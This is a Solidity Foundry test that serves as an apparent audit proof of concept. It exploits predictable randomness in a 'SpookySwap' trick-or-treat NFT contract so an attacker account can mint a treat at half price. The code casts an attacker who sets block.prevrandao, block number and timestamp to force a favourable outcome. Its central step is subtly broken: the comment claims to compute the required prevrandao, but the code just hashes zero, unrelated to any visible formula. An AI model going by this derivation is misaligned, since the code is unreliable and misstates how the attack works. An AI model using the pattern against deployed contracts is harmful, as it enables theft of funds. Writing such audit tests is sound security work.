// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import { SpookySwap } from "../src/TrickOrTreat.sol";

contract SpookySwapTest is Test {
    SpookySwap spookySwap;
    address attacker = makeAddr("attacker");

    function setUp() public {
        // Initialize the contract with a sample treat
        SpookySwap.Treat[] memory treats = new SpookySwap.Treat[](1);
        treats[0] = SpookySwap.Treat({
            name: "Candy",
            cost: 1 ether,
            metadataURI: "ipfs://Qm..."
        });
        spookySwap = new SpookySwap(treats);
    }

    function testManipulateRandomness() public {
        vm.deal(attacker, 1 ether); // Give the attacker some ETH
        vm.startPrank(attacker);

        // Set block variables to manipulate randomness
        uint256 desiredRandomNumber = 1; // Half-price treat
        uint256 nextTokenId = spookySwap.nextTokenId();
        address msgSender = attacker;

        // Brute-force block.prevrandao and block.timestamp
        // For simplicity, we'll simulate the manipulation

        // Calculate the required block.prevrandao to get random == 1
        // Note: In an actual attack, the miner would adjust these values
        uint256 manipulatedPrevrandao = uint256(
            keccak256(
                abi.encodePacked(desiredRandomNumber - 1)
            )
        );

        vm.roll(100); // Advance to block 100
        vm.warp(1000); // Set block.timestamp

        // Set manipulated block variables
        vm.prevrandao(manipulatedPrevrandao);

        // Call trickOrTreat with manipulated randomness
        uint256 initialBalance = attacker.balance;
        console2.log("Initial balance", initialBalance);
        spookySwap.trickOrTreat{value: 0.5 ether}("Candy");

        // Check that the attacker received the NFT at half price
        uint256 newBalance = attacker.balance;
        console2.log("New balance", newBalance);
        assertEq(newBalance, initialBalance - 0.5 ether);

        // Verify that the token was minted to the attacker
        uint256 tokenId = spookySwap.nextTokenId() - 1;
        assertEq(spookySwap.ownerOf(tokenId), attacker);

        vm.stopPrank();
    }
}
